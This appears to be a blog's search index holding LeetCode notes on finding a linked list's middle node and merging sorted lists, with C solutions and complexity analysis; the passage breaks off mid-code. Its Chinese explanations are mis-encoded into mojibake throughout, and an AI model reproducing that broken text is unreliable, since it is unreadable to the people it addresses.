<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ‰¾åˆ°éˆçµä¸²åˆ—çš„ä¸­é–“ç¯€é» | Easy |LeetCode#876 Middle of the Linked List</title>
      <link href="/posts/the_middle_of_the_list.html"/>
      <url>/posts/the_middle_of_the_list.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/876/question1.png"><br><img src="/img/LeetCode/876/question2.png"></p><ul><li>é¡Œç›®é›£åº¦: <code>Easy</code></li><li>é¡Œç›®æ•˜è¿°: çµ¦å®šä¸€å€‹ single linked list çš„ <code>head</code> ä¸¦ä¸”å¸Œæœ›å›å‚³ list çš„ä¸­é–“ç¯€é»ï¼Œè‹¥ä¸­é–“ç¯€é»æœ‰å…©å€‹ï¼Œéœ€è¦å›å‚³ç¬¬äºŒå€‹</li></ul><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="ä¸€é–‹å§‹çš„æƒ³æ³•"><a href="#ä¸€é–‹å§‹çš„æƒ³æ³•" class="headerlink" title="ä¸€é–‹å§‹çš„æƒ³æ³•"></a>ä¸€é–‹å§‹çš„æƒ³æ³•</h2><p><img src="/img/LeetCode/876/algo.png"></p><ol><li>å®šç¾©ç¯€é»çµæ§‹</li><li>å»ºç«‹ linked list</li><li>å‘¼å«å‡½æ•¸ <code>middleNode()</code></li></ol><p>åœ¨ <code>middleNode</code> å…§:</p><ol><li>Traverse listï¼Œæ‰æœ‰è¾¦æ³•çŸ¥é“ä¸­é–“ç¯€é»ï¼Œåœ¨ traverseéç¨‹é€éä¸€å€‹counterä¾†ç´€éŒ„æ•¸é‡</li><li>åˆ¤æ–·ç•¶å‰ç¯€é»æ•¸é‡æ˜¯å¥‡æ•¸é‚„æ˜¯å¶æ•¸ï¼Œå–å¾—ä¸­é–“ç¯€é»çš„ index </li><li>æ¥è‘—é‡æ–°èµ°è¨ªåˆ° middleNodeï¼Œä¸¦å›å‚³ç¯€é»</li></ol><h2 id="æˆ‘çš„è§£æ³•"><a href="#æˆ‘çš„è§£æ³•" class="headerlink" title="æˆ‘çš„è§£æ³•"></a>æˆ‘çš„è§£æ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">middle</span>=</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Traverse to the middle node, and return middle node</span></span><br><span class="line">    current = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="èªªæ˜"><a href="#èªªæ˜" class="headerlink" title="èªªæ˜"></a>èªªæ˜</h3><ul><li>åˆå§‹åŒ–è®Šæ•¸:<ul><li><code>current</code> ç”¨æ–¼éæ­·éˆçµä¸²åˆ—ï¼Œ<code>middle</code> ç”¨æ–¼å„²å­˜ä¸­é–“ç¯€é»ï¼Œ<code>counter</code> ç”¨æ–¼è¨ˆç®—ç¯€é»ç¸½æ•¸ï¼Œ<code>middleNodeIndex</code> ç”¨æ–¼å„²å­˜ä¸­é–“ç¯€é»çš„ç´¢å¼•ï¼Œ<code>isEven</code> ç”¨æ–¼åˆ¤æ–·ç¯€é»æ•¸æ˜¯å¦ç‚ºå¶æ•¸</li></ul></li><li>è¨ˆç®—list é•·åº¦è·Ÿä¸­é–“ç´¢å¼•:<ul><li>æ¯èµ°åˆ°ä¸€å€‹ç¯€é»å°±åˆ¤æ–·åŸºæ•¸å¶æ•¸ï¼Œä¸¦è¨ˆç®—ä¸­é–“ç¯€é»</li></ul></li><li>ä¹‹å¾Œé‡æ–°åˆå§‹åŒ– <code>current</code> æŒ‡æ¨™ä¸¦traverse åˆ° <code>middleNodeIndex</code>çš„ç¯€é»</li><li>è¿”å›ä¸­é–“ç¯€é»</li></ul><h3 id="å®Œæ•´æ¸¬è©¦ç¨‹å¼ç¢¼"><a href="#å®Œæ•´æ¸¬è©¦ç¨‹å¼ç¢¼" class="headerlink" title="å®Œæ•´æ¸¬è©¦ç¨‹å¼ç¢¼"></a>å®Œæ•´æ¸¬è©¦ç¨‹å¼ç¢¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">Node *first, *current, *previous;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node *first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node *first)</span>;</span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a 3-nodes linked list</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) &#123;</span><br><span class="line">        Node *current = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">0</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">7</span>;</span><br><span class="line">            first = current;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">1</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">2</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">2</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">3</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            current-&gt;val = <span class="number">9</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PrintList(first);</span><br><span class="line">    Node *mid = middleNode(first);</span><br><span class="line">    <span class="keyword">if</span> (mid != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Middle Node: %d \n&quot;</span>, mid-&gt;val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No middle node found.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FreeList(first);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node * ptr = first;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;empty list\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt;&quot;</span>, ptr-&gt;val);</span><br><span class="line">            ptr = ptr -&gt; next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *tmp, *current;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tmp = current;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>&#123;</span><br><span class="line">    Node *current = first;</span><br><span class="line">    Node *middle= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/876/results1.png"></p><blockquote><p>å¤§æ¦‚åŸ·è¡Œæ™‚é–“æ˜¯ 3msï¼Œä¸¦ä¸å¤ªç®—æ˜¯æ•ˆèƒ½è‰¯å¥½çš„å¯«æ³•<br>ç©ºé–“ä¹Ÿç”¨çš„æŒºå¤šï¼Œ5.66MB</p></blockquote><h2 id="ä¿®æ­£ç¨‹å¼ç¢¼"><a href="#ä¿®æ­£ç¨‹å¼ç¢¼" class="headerlink" title="ä¿®æ­£ç¨‹å¼ç¢¼"></a>ä¿®æ­£ç¨‹å¼ç¢¼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼æœ‰äº›å†—ï¼Œå› ç‚ºé¡Œç›®è¦æ±‚å¤šå€‹ä¸­é–“ç¯€é»æ™‚ï¼Œå–ç¬¬äºŒå€‹ç¯€é»å°±å¥½ï¼Œå› æ­¤å¥‡å¶æ•¸ä¸ç”¨åˆ†é–‹è™•ç†ï¼Œå¯ä»¥æ”¹æˆä¸‹é¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŸ·è¡Œçµæœä¹Ÿæœƒå¤§å¹…æå‡</p><p><img src="/img/LeetCode/876/results3.png"></p><h2 id="å…¶ä»–åšæ³•"><a href="#å…¶ä»–åšæ³•" class="headerlink" title="å…¶ä»–åšæ³•"></a>å…¶ä»–åšæ³•</h2><p>åœ¨è§£ç­”å€çœ‹åˆ°ä¸€å€‹å¯«å¾—å¾ˆè®šçš„ä½œæ³•ï¼Œä»–çš„æƒ³æ³•æ˜¯:</p><ol><li>æƒ³åƒä½ è·Ÿä½ æœ‹å‹æ­£è¦çˆ¬æ¨“æ¢¯</li><li>ä½ å€‘éƒ½ç«™åœ¨æ¨“æ¢¯åº•éƒ¨</li><li>ä½ æ¯æ¬¡çˆ¬ä¸€éšï¼Œè€Œä½ æœ‹å‹æ¯æ¬¡çˆ¬å…©éš (ä½ çš„å¹³å‡ä¸Šæ¨“é€Ÿåº¦æœƒæ˜¯ä½ æœ‹å‹çš„ä¸€åŠ)</li><li>ç•¶ä»–çˆ¬åˆ°é ‚ç«¯ï¼Œä½ å°±åœä¸‹ (æ°å¥½æœƒå¾…åœ¨æ¨“æ¢¯çš„ä¸€åŠä½ç½®)</li></ol><h3 id="æ­¥é©Ÿ"><a href="#æ­¥é©Ÿ" class="headerlink" title="æ­¥é©Ÿ"></a>æ­¥é©Ÿ</h3><p><img src="/img/LeetCode/876/algo2.png"></p><ol><li><strong>Initialization:</strong> Start with two pointers, fast and slow, both pointing to the head of the list.</li><li><strong>Traversal:</strong> Move the fast pointer two steps at a time and the slow pointer one step at a time. This ensures that when the fast pointer reaches the end of the list, the slow pointer will be at the middle node.</li><li><strong>Find the Middle Node:</strong> After traversal, the slow pointer will be at the middle node of the list.</li><li><strong>Edge Case Handling:</strong> Check if the list is empty or contains only one node. In such cases, the middle node is the head itself.</li><li><strong>Return:</strong> Return the node pointed to by the slow pointer as the middle node.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">fast_ptr</span>, *<span class="title">slw_ptr</span>;</span></span><br><span class="line">    fast_ptr = head;</span><br><span class="line">    slw_ptr = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fast_ptr != <span class="literal">NULL</span> &amp;&amp; fast_ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next-&gt;next;</span><br><span class="line">        slw_ptr = slw_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  slw_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸ·è¡Œçµæœ-1"><a href="#åŸ·è¡Œçµæœ-1" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/876/results2.png"></p><h2 id="è¤‡é›œåº¦åˆ†æ"><a href="#è¤‡é›œåº¦åˆ†æ" class="headerlink" title="è¤‡é›œåº¦åˆ†æ"></a>è¤‡é›œåº¦åˆ†æ</h2><h3 id="æ™‚é–“è¤‡é›œåº¦"><a href="#æ™‚é–“è¤‡é›œåº¦" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦"></a>æ™‚é–“è¤‡é›œåº¦</h3><ul><li>åœ¨èµ°è¨ªæ•´å€‹ list çš„æ™‚å€™é–“è¤‡é›œåº¦æ˜¯ $O(N)$ï¼ŒN ç‚ºç¯€é»æ•¸é‡</li><li>æ¥è‘—åœ¨æ‰¾å°‹ä¸­é–“ç¯€é»æ™‚é–“è¤‡é›œåº¦åŒæ¨£æ˜¯ $O(N)$</li><li>æ•´é«”è€Œè¨€ï¼Œ<code>middleNode</code> å‡½å¼çš„æ™‚é–“è¤‡é›œåº¦å¼ $O(N)+ O(N) &#x3D; O(N)$</li></ul><h3 id="ç©ºé–“è¤‡é›œåº¦"><a href="#ç©ºé–“è¤‡é›œåº¦" class="headerlink" title="ç©ºé–“è¤‡é›œåº¦"></a>ç©ºé–“è¤‡é›œåº¦</h3><p>ç©ºé–“æ¶ˆè€—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct ListNode *current = head;</span><br><span class="line">struct ListNode *middle = NULL;</span><br><span class="line">int counter = 0;</span><br><span class="line">int middleNodeIndex;</span><br><span class="line">bool isEven;</span><br></pre></td></tr></table></figure><ul><li>ç‚ºå¸¸æ•¸ç©ºé–“ï¼Œå› æ­¤é€™è£¡ç©ºé–“è¤‡é›œåº¦æœƒæ˜¯ $O(1)$</li><li>ä¸¦ä¸”æ²’æœ‰ä½¿ç”¨é¡å¤–çš„è³‡æ–™çµæ§‹ï¼Œæ‰€ä»¥æ•´é«”è€Œè¨€ç©ºé–“è¤‡é›œåº¦ä¹Ÿæ˜¯ $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆä½µéˆçµä¸²åˆ— | Easy | LeetCode#21 Merge Two Sorted Lists</title>
      <link href="/posts/8b576379.html"/>
      <url>/posts/8b576379.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/21/question1.png"><br><img src="/img/LeetCode/21/question2.png"></p><ul><li>é¡Œç›®é›£åº¦: <code>Easy</code></li><li>é¡Œç›®æè¿°: çµ¦å®šå…©å€‹å·²æ’åº linked list çš„ <code>head</code>ï¼Œå¸Œæœ›èƒ½å¤ åˆä½µæˆä¸€å€‹å·²æ’åºçš„list</li></ul><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="ä¸€é–‹å§‹çš„æƒ³æ³•"><a href="#ä¸€é–‹å§‹çš„æƒ³æ³•" class="headerlink" title="ä¸€é–‹å§‹çš„æƒ³æ³•"></a>ä¸€é–‹å§‹çš„æƒ³æ³•</h2><p><img src="/img/LeetCode/21/algo.jpg"></p><p>ä¸€é–‹å§‹æˆ‘æƒ³èªªå¯ä»¥å…ˆèµ°è¨ª <code>list1</code> ç„¶å¾Œé€é …æ¯”å° <code>list2</code> çš„itemï¼Œå¦‚æœ <code>list1</code>ä¸­çš„å…ƒç´ å°æ–¼ <code>list2</code> çš„ï¼Œå°±æ’å…¥åˆ° <code>list2</code>ï¼Œä¸¦ä¸”æ’å…¥å¾Œï¼Œå†ç¹¼çºŒè¿­ä»£ <code>list1</code>ç•¶ä¸­çš„å…ƒç´ </p><p>åŸå§‹ä»£ç¢¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Node *ptr1, *ptr2, *previous, *preceding; </span><br><span class="line">ptr1 = list1;</span><br><span class="line">ptr2 = list2;</span><br><span class="line">preceding = ptr1;</span><br><span class="line">previous = ptr2;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Empty lists</span></span><br><span class="line"><span class="keyword">if</span>(ptr1==<span class="literal">NULL</span> &amp;&amp; ptr2==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="comment">//return empty list</span></span><br><span class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr1 == <span class="literal">NULL</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> ptr2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ptr2 == <span class="literal">NULL</span>)&#123;</span><br><span 